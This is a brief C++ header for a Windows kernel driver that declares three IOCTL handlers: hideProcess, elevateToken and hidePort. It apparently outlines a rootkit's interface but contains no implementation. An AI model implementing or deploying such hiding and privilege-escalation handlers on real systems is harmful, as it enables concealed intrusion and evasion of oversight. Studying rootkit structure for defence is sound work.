#pragma once
#include <ntifs.h>

namespace IoctlHandlers {

	NTSTATUS hideProcess(PIRP irp);

	NTSTATUS elevateToken(PIRP irp);

	NTSTATUS hidePort(PIRP irp);
}